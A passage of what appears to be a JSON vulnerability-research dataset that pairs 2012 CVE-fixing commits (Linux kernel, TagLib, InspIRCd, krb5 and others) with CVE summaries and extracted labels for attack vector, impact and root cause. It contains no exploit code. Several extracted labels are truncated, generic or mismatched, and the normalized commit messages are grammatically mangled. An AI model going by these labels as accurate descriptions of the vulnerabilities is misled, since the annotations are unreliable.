attacker"},{"commit_id":"d50f2ab6f050311dbf7b8f5501b25f0bf64a439b","cve_id":"CVE-2012-2100","cwe_id":"CWE-189","commit_message":"ext4: fix undefined behavior in ext4_fill_flex_info()\n\nCommit 503358ae01b70ce6909d19dd01287093f6b6271c (\"ext4: avoid divide by\nzero when trying to mount a corrupted file system\") fixes CVE-2009-4307\nby performing a sanity check on s_log_groups_per_flex, since it can be\nset to a bogus value by an attacker.\n\n\tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;\n\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n\n\tif (groups_per_flex < 2) { ... }\n\nThis patch fixes two potential issues in the previous commit.\n\n1) The sanity check might only work on architectures like PowerPC.\nOn x86, 5 bits are used for the shifting amount.  That means, given a\nlarge s_log_groups_per_flex value like 36, groups_per_flex = 1 << 36\nis essentially 1 << 4 = 16, rather than 0.  This will bypass the check,\nleaving s_log_groups_per_flex and groups_per_flex inconsistent.\n\n2) The sanity check relies on undefined behavior, i.e., oversized shift.\nA standard-confirming C compiler could rewrite the check in unexpected\nways.  Consider the following equivalent form, assuming groups_per_flex\nis unsigned for simplicity.\n\n\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n\tif (groups_per_flex == 0 || groups_per_flex == 1) {\n\nWe compile the code snippet using Clang 3.0 and GCC 4.6.  Clang will\ncompletely optimize away the check groups_per_flex == 0, leaving the\npatched code as vulnerable as the original.  GCC keeps the check, but\nthere is no guarantee that future versions will do the same.\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>\nCc: stable@vger.kernel.org","summary":"The ext4_fill_flex_info function in fs\/ext4\/super.c in the Linux kernel before 3.2.2, on the x86 platform and unspecified other platforms, allows user-assisted remote attackers to trigger inconsistent filesystem-groups data and possibly cause a denial of service via a malformed ext4 filesystem containing a super block with a large FLEX_BG group size (aka s_log_groups_per_flex value).  NOTE: this vulnerability exists because of an incomplete fix for CVE-2009-4307.","commit_message_1":"fix undefined behavior in ext4_fill_flex_info ( ) commit 503358ae01b70ce6909d19dd01287093f6b6271c ( `` ext4 : avoid divide by zero when trying to mount a corrupted file system '' ) fix <cve_id> by performing a sanity check on s_log_groups_per_flex , since it can be set to a bogus value by an attacker","Vulnerability Type":"Numeric Errors","Attack Vector":"via a malformed ext4 filesystem containing a super block with a large flex _ bg group size ( aka s _ log _ groups _ per _ flex value ) ","Impact":"trigger inconsistent filesystem - groups data and possibly cause a denial of service","Root Cause":"caused by a divide-by-zero error","Attack Type":"remote attacker"},{"commit_id":"fe7dbd2c104c37f6f3af7d9f1646a3c332aea4a4","cve_id":"CVE-2012-1836","cwe_id":"CWE-119","commit_message":"Merge pull request #1 from nenolod\/insp20\n\nDNS resolver hardening (insp20 branch)","summary":"Heap-based buffer overflow in dns.cpp in InspIRCd 2.0.5 might allow remote attackers to execute arbitrary code via a crafted DNS query that uses compression.","commit_message_1":"merge pull request # <number> from nenolod\/insp20","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted dns query that uses compression","Impact":"execute arbitrary code","Root Cause":"caused by improper bounds checking by the dns.cpp when handling DNS responses","Attack Type":"remote attacker"},{"commit_id":"9c895160d25a76c21b65bad141b08e8d4f99afef","cve_id":"CVE-2012-1601","cwe_id":"CWE-399","commit_message":"KVM: Ensure all vcpus are consistent with in-kernel irqchip settings\n\n(cherry picked from commit 3e515705a1f46beb1c942bb8043c16f8ac7b1e9e)\n\nIf some vcpus are created before KVM_CREATE_IRQCHIP, then\nirqchip_in_kernel() and vcpu->arch.apic will be inconsistent, leading\nto potential NULL pointer dereferences.\n\nFix by:\n- ensuring that no vcpus are installed when KVM_CREATE_IRQCHIP is called\n- ensuring that a vcpu has an apic if it is installed after KVM_CREATE_IRQCHIP\n\nThis is somewhat long winded because vcpu->arch.apic is created without\nkvm->lock held.\n\nBased on earlier patch by Michael Ellerman.\n\nSigned-off-by: Michael Ellerman <michael@ellerman.id.au>\nSigned-off-by: Avi Kivity <avi@redhat.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The KVM implementation in the Linux kernel before 3.3.6 allows host OS users to cause a denial of service (NULL pointer dereference and host OS crash) by making a KVM_CREATE_IRQCHIP ioctl call after a virtual CPU already exists.","commit_message_1":"ensure all vcpus are consistent with in-kernel irqchip setting ( cherry picked from commit 3e515705a1f46beb1c942bb8043c16f8ac7b1e9e ) if some vcpus are created before kvm_create_irqchip , then irqchip_in_kernel ( ) and vcpu- > <file> will be inconsistent , leading to potential null pointer dereferences","Vulnerability Type":"Resource Management Errors","Attack Vector":"by making a kvm _ create _ irqchip ioctl call after a virtual cpu already exists","Impact":"cause a denial of service ( pointer dereference and host os crash )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"dcdf4fd954e3213c355746fa15b7480461972308","cve_id":"CVE-2012-1584","cwe_id":"CWE-189","commit_message":"Avoid uint overflow in case the length + index is over UINT_MAX","summary":"Integer overflow in the mid function in toolkit\/tbytevector.cpp in TagLib 1.7 and earlier allows context-dependent attackers to cause a denial of service (application crash) via a crafted file header field in a media file, which triggers a large memory allocation.","commit_message_1":"avoid uint overflow in case the length + index is over uint_max","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted file header field in a media file , which triggers a large memory allocation ","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"d0772b70faaf8e9f2013b6c4273d94d5eac8047a","cve_id":"CVE-2012-1583","cwe_id":"CWE-399","commit_message":"[IPV6]: Fix slab corruption running ip6sic\n\nFrom: Eric Sesterhenn <snakebyte@gmx.de>\n\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Double free vulnerability in the xfrm6_tunnel_rcv function in net\/ipv6\/xfrm6_tunnel.c in the Linux kernel before 2.6.22, when the xfrm6_tunnel module is enabled, allows remote attackers to cause a denial of service (panic) via crafted IPv6 packets.","commit_message_1":": fix slab corruption running ip6sic","Vulnerability Type":"Resource Management Errors","Attack Vector":"via crafted ipv6 packets","Impact":"cause a denial of service ( panic )","Root Cause":"when the xfrm6 _ tunnel module is enabled ","Attack Type":"remote attacker"},{"commit_id":"1aec04dbf8a24b8a6ba64c4f74efa0628e36db0b","cve_id":"CVE-2012-1571","cwe_id":"CWE-119","commit_message":"Fix bounds checks again.","summary":"file before 5.11 and libmagic allow remote attackers to cause a denial of service (crash) via a crafted Composite Document File (CDF) file that triggers (1) an out-of-bounds read or (2) an invalid pointer dereference.","commit_message_1":"fix bound check again","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted composite document file ( cdf ) file that triggers ( 1 ) an out - of - bounds read or ( 2 ) an invalid pointer dereference ","Impact":"cause a denial of service ( crash )","Root Cause":"caused by improper bounds checking when processing malformed files","Attack Type":"remote attacker"},{"commit_id":"4a1d704194a441bf83c636004a479e01360ec850","cve_id":"CVE-2012-1179","cwe_id":"CWE-264","commit_message":"mm: thp: fix pmd_bad() triggering in code paths holding mmap_sem read mode\n\ncommit 1a5a9906d4e8d1976b701f889d8f35d54b928f25 upstream.\n\nIn some cases it may happen that pmd_none_or_clear_bad() is called with\nthe mmap_sem hold in read mode.  In those cases the huge page faults can\nallocate hugepmds under pmd_none_or_clear_bad() and that can trigger a\nfalse positive from pmd_bad() that will not like to see a pmd\nmaterializing as trans huge.\n\nIt's not khugepaged causing the problem, khugepaged holds the mmap_sem\nin write mode (and all those sites must hold the mmap_sem in read mode\nto prevent pagetables to go away from under them, during code review it\nseems vm86 mode on 32bit kernels requires that too unless it's\nrestricted to 1 thread per process or UP builds).  The race is only with\nthe huge pagefaults that can convert a pmd_none() into a\npmd_trans_huge().\n\nEffectively all these pmd_none_or_clear_bad() sites running with\nmmap_sem in read mode are somewhat speculative with the page faults, and\nthe result is always undefined when they run simultaneously.  This is\nprobably why it wasn't common to run into this.  For example if the\nmadvise(MADV_DONTNEED) runs zap_page_range() shortly before the page\nfault, the hugepage will not be zapped, if the page fault runs first it\nwill be zapped.\n\nAltering pmd_bad() not to error out if it finds hugepmds won't be enough\nto fix this, because zap_pmd_range would then proceed to call\nzap_pte_range (which would be incorrect if the pmd become a\npmd_trans_huge()).\n\nThe simplest way to fix this is to read the pmd in the local stack\n(regardless of what we read, no need of actual CPU barriers, only\ncompiler barrier needed), and be sure it is not changing under the code\nthat computes its value.  Even if the real pmd is changing under the\nvalue we hold on the stack, we don't care.  If we actually end up in\nzap_pte_range it means the pmd was not none already and it was not huge,\nand it can't become huge from under us (khugepaged locking explained\nabove).\n\nAll we need is to enforce that there is no way anymore that in a code\npath like below, pmd_trans_huge can be false, but pmd_none_or_clear_bad\ncan run into a hugepmd.  The overhead of a barrier() is just a compiler\ntweak and should not be measurable (I only added it for THP builds).  I\ndon't exclude different compiler versions may have prevented the race\ntoo by caching the value of *pmd on the stack (that hasn't been\nverified, but it wouldn't be impossible considering\npmd_none_or_clear_bad, pmd_bad, pmd_trans_huge, pmd_none are all inlines\nand there's no external function called in between pmd_trans_huge and\npmd_none_or_clear_bad).\n\n\t\tif (pmd_trans_huge(*pmd)) {\n\t\t\tif (next-addr != HPAGE_PMD_SIZE) {\n\t\t\t\tVM_BUG_ON(!rwsem_is_locked(&tlb->mm->mmap_sem));\n\t\t\t\tsplit_huge_page_pmd(vma->vm_mm, pmd);\n\t\t\t} else if (zap_huge_pmd(tlb, vma, pmd, addr))\n\t\t\t\tcontinue;\n\t\t\t\/* fall through *\/\n\t\t}\n\t\tif (pmd_none_or_clear_bad(pmd))\n\nBecause this race condition could be exercised without special\nprivileges this was reported in CVE-2012-1179.\n\nThe race was identified and fully explained by Ulrich who debugged it.\nI'm quoting his accurate explanation below, for reference.\n\n====== start quote =======\n      mapcount 0 page_mapcount 1\n      kernel BUG at mm\/huge_memory.c:1384!\n\n    At some point prior to the panic, a \"bad pmd ...\" message similar to the\n    following is logged on the console:\n\n      mm\/memory.c:145: bad pmd ffff8800376e1f98(80000000314000e7).\n\n    The \"bad pmd ...\" message is logged by pmd_clear_bad() before it clears\n    the page's PMD table entry.\n\n        143 void pmd_clear_bad(pmd_t *pmd)\n        144 {\n    ->  145         pmd_ERROR(*pmd);\n        146         pmd_clear(pmd);\n        147 }\n\n    After the PMD table entry has been cleared, there is an inconsistency\n    between the actual number of PMD table entries that are mapping the page\n    and the page's map count (_mapcount field in struct page). When the page\n    is subsequently reclaimed, __split_huge_page() detects this inconsistency.\n\n       1381         if (mapcount != page_mapcount(page))\n       1382                 printk(KERN_ERR \"mapcount %d page_mapcount %d\\n\",\n       1383                        mapcount, page_mapcount(page));\n    -> 1384         BUG_ON(mapcount != page_mapcount(page));\n\n    The root cause of the problem is a race of two threads in a multithreaded\n    process. Thread B incurs a page fault on a virtual address that has never\n    been accessed (PMD entry is zero) while Thread A is executing an madvise()\n    system call on a virtual address within the same 2 MB (huge page) range.\n\n               virtual address space\n              .---------------------.\n              |                     |\n              |                     |\n            .-|---------------------|\n            | |                     |\n            | |                     |<-- B(fault)\n            | |                     |\n      2 MB  | |\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|-.\n      huge <  |\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|  > A(range)\n      page  | |\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|-'\n            | |                     |\n            | |                     |\n            '-|---------------------|\n              |                     |\n              |                     |\n              '---------------------'\n\n    - Thread A is executing an madvise(..., MADV_DONTNEED) system call\n      on the virtual address range \"A(range)\" shown in the picture.\n\n    sys_madvise\n      \/\/ Acquire the semaphore in shared mode.\n      down_read(&current->mm->mmap_sem)\n      ...\n      madvise_vma\n        switch (behavior)\n        case MADV_DONTNEED:\n             madvise_dontneed\n               zap_page_range\n                 unmap_vmas\n                   unmap_page_range\n                     zap_pud_range\n                       zap_pmd_range\n                         \/\/\n                         \/\/ Assume that this huge page has never been accessed.\n                         \/\/ I.e. content of the PMD entry is zero (not mapped).\n                         \/\/\n                         if (pmd_trans_huge(*pmd)) {\n                             \/\/ We don't get here due to the above assumption.\n                         }\n                         \/\/\n                         \/\/ Assume that Thread B incurred a page fault and\n             .---------> \/\/ sneaks in here as shown below.\n             |           \/\/\n             |           if (pmd_none_or_clear_bad(pmd))\n             |               {\n             |                 if (unlikely(pmd_bad(*pmd)))\n             |                     pmd_clear_bad\n             |                     {\n             |                       pmd_ERROR\n             |                         \/\/ Log \"bad pmd ...\" message here.\n             |                       pmd_clear\n             |                         \/\/ Clear the page's PMD entry.\n             |                         \/\/ Thread B incremented the map count\n             |                         \/\/ in page_add_new_anon_rmap(), but\n             |                         \/\/ now the page is no longer mapped\n             |                         \/\/ by a PMD entry (-> inconsistency).\n             |                     }\n             |               }\n             |\n             v\n    - Thread B is handling a page fault on virtual address \"B(fault)\" shown\n      in the picture.\n\n    ...\n    do_page_fault\n      __do_page_fault\n        \/\/ Acquire the semaphore in shared mode.\n        down_read_trylock(&mm->mmap_sem)\n        ...\n        handle_mm_fault\n          if (pmd_none(*pmd) && transparent_hugepage_enabled(vma))\n              \/\/ We get here due to the above assumption (PMD entry is zero).\n              do_huge_pmd_anonymous_page\n                alloc_hugepage_vma\n                  \/\/ Allocate a new transparent huge page here.\n                ...\n                __do_huge_pmd_anonymous_page\n                  ...\n                  spin_lock(&mm->page_table_lock)\n                  ...\n                  page_add_new_anon_rmap\n                    \/\/ Here we increment the page's map count (starts at -1).\n                    atomic_set(&page->_mapcount, 0)\n                  set_pmd_at\n                    \/\/ Here we set the page's PMD entry which will be cleared\n                    \/\/ when Thread A calls pmd_clear_bad().\n                  ...\n                  spin_unlock(&mm->page_table_lock)\n\n    The mmap_sem does not prevent the race because both threads are acquiring\n    it in shared mode (down_read).  Thread B holds the page_table_lock while\n    the page's map count and PMD table entry are updated.  However, Thread A\n    does not synchronize on that lock.\n\n====== end quote =======\n\n[akpm@linux-foundation.org: checkpatch fixes]\nReported-by: Ulrich Obergfell <uobergfe@redhat.com>\nSigned-off-by: Andrea Arcangeli <aarcange@redhat.com>\nAcked-by: Johannes Weiner <hannes@cmpxchg.org>\nCc: Mel Gorman <mgorman@suse.de>\nCc: Hugh Dickins <hughd@google.com>\nCc: Dave Jones <davej@redhat.com>\nAcked-by: Larry Woodman <lwoodman@redhat.com>\nAcked-by: Rik van Riel <riel@redhat.com>\nCc: Mark Salter <msalter@redhat.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The Linux kernel before 3.3.1, when KVM is used, allows guest OS users to cause a denial of service (host OS crash) by leveraging administrative access to the guest OS, related to the pmd_none_or_clear_bad function and page faults for huge pages.","commit_message_1":"thp : fix pmd_bad ( ) triggering in code path holding mmap_sem read mode commit 1a5a9906d4e8d1976b701f889d8f35d54b928f25 upstream","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging administrative access to the guest os , related to the pmd _ none _ or _ clear _ bad function and page faults for huge pages","Impact":"cause a denial of service ( host os crash )","Root Cause":"caused by a race condition when handling PMD table entries","Attack Type":"local attacker"},{"commit_id":"d2860c655357975e7b32d84e6b45e98f0dcecd7a","cve_id":"CVE-2012-1176","cwe_id":"CWE-119","commit_message":"refactor pyfribidi.c module\n\npyfribidi.c is now compiled as _pyfribidi. This module only handles\nunicode internally and doesn't use the fribidi_utf8_to_unicode\nfunction (which can't handle 4 byte utf-8 sequences). This fixes the\nbuffer overflow in issue #2.\n\nThe code is now also much simpler: pyfribidi.c is down from 280 to 130\nlines of code.\n\nWe now ship a pure python pyfribidi that handles the case when\nnon-unicode strings are passed in.\n\nWe now also adapt the size of the output string if clean=True is\npassed.","summary":"Buffer overflow in the fribidi_utf8_to_unicode function in PyFriBidi before 0.11.0 allows remote attackers to cause a denial of service (application crash) via a 4-byte utf-8 sequence.","commit_message_1":"refactor <file> module <file> is now compiled a _pyfribidi","Vulnerability Type":"buffer overflow","Attack Vector":"via a 4 - byte utf - 8 sequence","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by improper bounds checking when 4-byte utf-8 sequences","Attack Type":"remote attacker"},{"commit_id":"371528caec553785c37f73fa3926ea0de84f986f","cve_id":"CVE-2012-1146","cwe_id":null,"commit_message":"mm: memcg: Correct unregistring of events attached to the same eventfd\n\nThere is an issue when memcg unregisters events that were attached to\nthe same eventfd:\n\n- On the first call mem_cgroup_usage_unregister_event() removes all\n  events attached to a given eventfd, and if there were no events left,\n  thresholds->primary would become NULL;\n\n- Since there were several events registered, cgroups core will call\n  mem_cgroup_usage_unregister_event() again, but now kernel will oops,\n  as the function doesn't expect that threshold->primary may be NULL.\n\nThat's a good question whether mem_cgroup_usage_unregister_event()\nshould actually remove all events in one go, but nowadays it can't\ndo any better as cftype->unregister_event callback doesn't pass\nany private event-associated cookie. So, let's fix the issue by\nsimply checking for threshold->primary.\n\nFWIW, w\/o the patch the following oops may be observed:\n\n BUG: unable to handle kernel NULL pointer dereference at 0000000000000004\n IP: [<ffffffff810be32c>] mem_cgroup_usage_unregister_event+0x9c\/0x1f0\n Pid: 574, comm: kworker\/0:2 Not tainted 3.3.0-rc4+ #9 Bochs Bochs\n RIP: 0010:[<ffffffff810be32c>]  [<ffffffff810be32c>] mem_cgroup_usage_unregister_event+0x9c\/0x1f0\n RSP: 0018:ffff88001d0b9d60  EFLAGS: 00010246\n Process kworker\/0:2 (pid: 574, threadinfo ffff88001d0b8000, task ffff88001de91cc0)\n Call Trace:\n  [<ffffffff8107092b>] cgroup_event_remove+0x2b\/0x60\n  [<ffffffff8103db94>] process_one_work+0x174\/0x450\n  [<ffffffff8103e413>] worker_thread+0x123\/0x2d0\n\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Anton Vorontsov <anton.vorontsov@linaro.org>\nAcked-by: KAMEZAWA Hiroyuki <kamezawa.hiroyu@jp.fujitsu.com>\nCc: Kirill A. Shutemov <kirill@shutemov.name>\nCc: Michal Hocko <mhocko@suse.cz>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The mem_cgroup_usage_unregister_event function in mm\/memcontrol.c in the Linux kernel before 3.2.10 does not properly handle multiple events that are attached to the same eventfd, which allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by registering memory threshold events.","commit_message_1":"memcg : correct unregistring of event attached to the same eventfd there is an issue when memcg unregisters event that were attached to the same eventfd : - on the first call mem_cgroup_usage_unregister_event ( ) remove all event attached to a given eventfd , and if there were no event left , thresholds- > primary would become null ; - since there were several event registered , cgroups core will call mem_cgroup_usage_unregister_event ( ) again , but now kernel will oops , a the function doe n't expect that threshold- > primary may be null","Vulnerability Type":"NULL pointer dereference","Attack Vector":"by registering memory threshold events","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"does not properly handle multiple events that are attached to the same eventfd","Attack Type":"local attacker"},{"commit_id":"b3646a07348ffa276ea41a9dae03ddc63ea6c532","cve_id":"CVE-2012-1108","cwe_id":"CWE-20","commit_message":"Be more careful when parsing Vorbis Comments","summary":"The parse function in ogg\/xiphcomment.cpp in TagLib 1.7 and earlier allows remote attackers to cause a denial of service (crash) via a crafted vendorLength field in an ogg file.","commit_message_1":"be more careful when parsing vorbis comment","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted vendorlength field in an ogg file","Impact":"cause a denial of service ( crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"77d61c6eca4d08b9b025738acf6b926cc750db23","cve_id":"CVE-2012-1107","cwe_id":null,"commit_message":"Make sure to not try dividing by zero","summary":"The analyzeCurrent function in ape\/apeproperties.cpp in TagLib 1.7 and earlier allows context-dependent attackers to cause a denial of service (application crash) via a crafted sampleRate in an ape file, which triggers a divide-by-zero error.","commit_message_1":"make sure to not try dividing by zero","Vulnerability Type":"divide-by-zero error","Attack Vector":"via a crafted samplerate in an ape file , which triggers a divide - by - zero error","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by a division-by-zero error","Attack Type":"remote attacker"},{"commit_id":"c8e252586f8d5de906385d8cf6385fee289a825e","cve_id":"CVE-2012-1097","cwe_id":null,"commit_message":"regset: Prevent null pointer reference on readonly regsets\n\nThe regset common infrastructure assumed that regsets would always\nhave .get and .set methods, but not necessarily .active methods.\nUnfortunately people have since written regsets without .set methods.\n\nRather than putting in stub functions everywhere, handle regsets with\nnull .get or .set methods explicitly.\n\nSigned-off-by: H. Peter Anvin <hpa@zytor.com>\nReviewed-by: Oleg Nesterov <oleg@redhat.com>\nAcked-by: Roland McGrath <roland@hack.frob.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The regset (aka register set) feature in the Linux kernel before 3.2.10 does not properly handle the absence of .get and .set methods, which allows local users to cause a denial of service (NULL pointer dereference) or possibly have unspecified other impact via a (1) PTRACE_GETREGSET or (2) PTRACE_SETREGSET ptrace call.","commit_message_1":"prevent null pointer reference on readonly regsets the regset common infrastructure assumed that regsets would always have","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a ( 1 ) ptrace _ getregset or ( 2 ) ptrace _ setregset ptrace call","Impact":"cause a denial of service ( pointer dereference ) or possibly have unspecified other impact","Root Cause":"does not properly handle the absence of . get and . set methods","Attack Type":"local attacker"},{"commit_id":"88d7d4e4a439f32acc56a6d860e415ee71d3df08","cve_id":"CVE-2012-1090","cwe_id":"CWE-264","commit_message":"cifs: fix dentry refcount leak when opening a FIFO on lookup\n\ncommit 5bccda0ebc7c0331b81ac47d39e4b920b198b2cd upstream.\n\nThe cifs code will attempt to open files on lookup under certain\ncircumstances. What happens though if we find that the file we opened\nwas actually a FIFO or other special file?\n\nCurrently, the open filehandle just ends up being leaked leading to\na dentry refcount mismatch and oops on umount. Fix this by having the\ncode close the filehandle on the server if it turns out not to be a\nregular file. While we're at it, change this spaghetti if statement\ninto a switch too.\n\nReported-by: CAI Qian <caiqian@redhat.com>\nTested-by: CAI Qian <caiqian@redhat.com>\nReviewed-by: Shirish Pargaonkar <shirishpargaonkar@gmail.com>\nSigned-off-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <smfrench@gmail.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The cifs_lookup function in fs\/cifs\/dir.c in the Linux kernel before 3.2.10 allows local users to cause a denial of service (OOPS) via attempted access to a special file, as demonstrated by a FIFO.","commit_message_1":"fix dentry refcount leak when opening a fifo on lookup commit 5bccda0ebc7c0331b81ac47d39e4b920b198b2cd upstream","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via attempted access to a special file , as demonstrated by a fifo","Impact":"cause a denial of service ( oops )","Root Cause":"caused by an error that occurs during the CIFS umount operation","Attack Type":"local attacker"},{"commit_id":"c5be6209311d4a8f10fda37d0d3f876c1b33b77b","cve_id":"CVE-2012-1013","cwe_id":null,"commit_message":"Null pointer deref in kadmind [CVE-2012-1013]\n\nThe fix for #6626 could cause kadmind to dereference a null pointer if\na create-principal request contains no password but does contain the\nKRB5_KDB_DISALLOW_ALL_TIX flag (e.g. \"addprinc -randkey -allow_tix\nname\").  Only clients authorized to create principals can trigger the\nbug.  Fix the bug by testing for a null password in check_1_6_dummy.\n\nCVSSv2 vector: AV:N\/AC:M\/Au:S\/C:N\/I:N\/A:P\/E:H\/RL:O\/RC:C\n\n[ghudson@mit.edu: Minor style change and commit message]\n\nticket: 7152\ntarget_version: 1.10.2\ntags: pullup","summary":"The check_1_6_dummy function in lib\/kadm5\/srv\/svr_principal.c in kadmind in MIT Kerberos 5 (aka krb5) 1.8.x, 1.9.x, and 1.10.x before 1.10.2 allows remote authenticated administrators to cause a denial of service (NULL pointer dereference and daemon crash) via a KRB5_KDB_DISALLOW_ALL_TIX create request that lacks a password.","commit_message_1":"null pointer deref in kadmind [ <cve_id> ] the fix for # <number> could cause kadmind to dereference a null pointer if a create-principal request contains no password but doe contain the krb5_kdb_disallow_all_tix flag ( <file>","Vulnerability Type":"NULL pointer dereference","Attack Vector":"By sending a specially-crafted create-principal request","Impact":"cause a denial of service ( pointer dereference and daemon crash","Root Cause":"caused by a NULL pointer dereference error","Attack Type":"remote attacker"},{"commit_id":"2702b1526c7278c4d65d78de209a465d4de2885e","cve_id":"CVE-2012-0957","cwe_id":"CWE-16","commit_message":"kernel\/sys.c: fix stack memory content leak via UNAME26\n\nCalling uname() with the UNAME26 personality set allows a leak of kernel\nstack contents.  This fixes it by defensively calculating the length of\ncopy_to_user() call, making the len argument unsigned, and initializing\nthe stack buffer to zero (now technically unneeded, but hey, overkill).\n\nCVE-2012-0957\n\nReported-by: PaX Team <pageexec@freemail.hu>\nSigned-off-by: Kees Cook <keescook@chromium.org>\nCc: Andi Kleen <ak@linux.intel.com>\nCc: PaX Team <pageexec@freemail.hu>\nCc: Brad Spengler <spender@grsecurity.net>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The override_release function in kernel\/sys.c in the Linux kernel before 3.4.16 allows local users to obtain sensitive information from kernel stack memory via a uname system call in conjunction with a UNAME26 personality.","commit_message_1":"fix stack memory content leak via uname26 calling uname ( ) with the uname26 personality set allows a leak of kernel stack content","Vulnerability Type":"Configuration","Attack Vector":"via a uname system call in conjunction with a uname26 personality .","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"caused by an error within the uname() syscall when invoked using the UNAME26 personality","Attack Type":"local attacker"},{"commit_id":"61cc74fbb87af6aa551a06a370590c9bc07e29d9","cve_id":"CVE-2012-0879","cwe_id":"CWE-20","commit_message":"block: Fix io_context leak after clone with CLONE_IO\n\nWith CLONE_IO, copy_io() increments both ioc->refcount and ioc->nr_tasks.\nHowever exit_io_context() only decrements ioc->refcount if ioc->nr_tasks\nreaches 0.\n\nAlways call put_io_context() in exit_io_context().\n\nSigned-off-by: Louis Rilling <louis.rilling@kerlabs.com>\nSigned-off-by: Jens Axboe <jens.axboe@oracle.com>","summary":"The I\/O implementation for block devices in the Linux kernel before 2.6.33 does not properly handle the CLONE_IO feature, which allows local users to cause a denial of service (I\/O instability) by starting multiple processes that share an I\/O context.","commit_message_1":"fix io_context leak after clone with clone_io with clone_io , copy_io ( ) increment both ioc- > refcount and ioc- > nr_tasks","Vulnerability Type":"Improper Input Validation","Attack Vector":"by starting multiple processes that share an i \/ o context","Impact":"cause a denial of service ( i \/ o instability )","Root Cause":"does not properly handle the clone _ io feature","Attack Type":"local attacker"},{"commit_id":"5632c35d6759f5e13a7dfe78e4ee6403ff6a8e3e","cve_id":"CVE-2012-0863","cwe_id":"CWE-310","commit_message":"Explicitly remove file permissions for settings and DB","summary":"Mumble 1.2.3 and earlier uses world-readable permissions for .local\/share\/data\/Mumble\/.mumble.sqlite files in home directories, which might allow local users to obtain a cleartext password and configuration data by reading a file.","commit_message_1":"explicitly remove file permission for setting and db","Vulnerability Type":"Cryptographic Issues","Attack Vector":"by reading a file .","Impact":"obtain sensitive information","Root Cause":"caused by the creation of the ~\/.local\/share\/data\/Mumble\/.mumble.sqlite) database file with world-readable permissions","Attack Type":"local attacker"},{"commit_id":"73b1968ee30f6d9d2dae497544b910e68e114bfa","cve_id":"CVE-2012-0807","cwe_id":"CWE-119","commit_message":"Fixed stack based buffer overflow in transparent cookie encryption (see separate advisory)","summary":"Stack-based buffer overflow in the suhosin_encrypt_single_cookie function in the transparent cookie-encryption feature in the Suhosin extension before 0.9.33 for PHP, when suhosin.cookie.encrypt and suhosin.multiheader are enabled, might allow remote attackers to execute arbitrary code via a long string that is used in a Set-Cookie HTTP header.","commit_message_1":"fixed stack based buffer overflow in transparent cookie encryption ( see separate advisory )","Vulnerability Type":"buffer overflow","Attack Vector":"code via a long string that is used in a set - cookie http header","Impact":"execute arbitrary","Root Cause":"when suhosin . cookie . encrypt and suhosin . multiheader are enabled","Attack Type":"remote attacker"},{"commit_id":"a8c1f65c79cbbb2f7da782d4c9d15639a9b94b27","cve_id":"CVE-2012-0207","cwe_id":"CWE-399","commit_message":"igmp: Avoid zero delay when receiving odd mixture of IGMP queries\n\nCommit 5b7c84066733c5dfb0e4016d939757b38de189e4 ('ipv4: correct IGMP\nbehavior on v3 query during v2-compatibility mode') added yet another\ncase for query parsing, which can result in max_delay = 0.  Substitute\na value of 1, as in the usual v3 case.\n\nReported-by: Simon McVittie <smcv@debian.org>\nReferences: http:\/\/bugs.debian.org\/654876\nSigned-off-by: Ben Hutchings <ben@decadent.org.uk>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The igmp_heard_query function in net\/ipv4\/igmp.c in the Linux kernel before 3.2.1 allows remote attackers to cause a denial of service (divide-by-zero error and panic) via IGMP packets.","commit_message_1":"avoid zero delay when receiving odd mixture of igmp query commit 5b7c84066733c5dfb0e4016d939757b38de189e4 ( 'ipv4 : correct igmp behavior on v3 query during v2-compatibility mode ' ) added yet another case for query parsing , which can result in max_delay = <number>","Vulnerability Type":"Resource Management Errors","Attack Vector":"via igmp packets","Impact":"cause a denial of service ( divide - by - zero error and panic )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"802f43594d6e4d2ac61086d239153c17873a0428","cve_id":"CVE-2012-0058","cwe_id":"CWE-399","commit_message":"Unused iocbs in a batch should not be accounted as active.\n\ncommit 69e4747ee9727d660b88d7e1efe0f4afcb35db1b upstream.\n\nSince commit 080d676de095 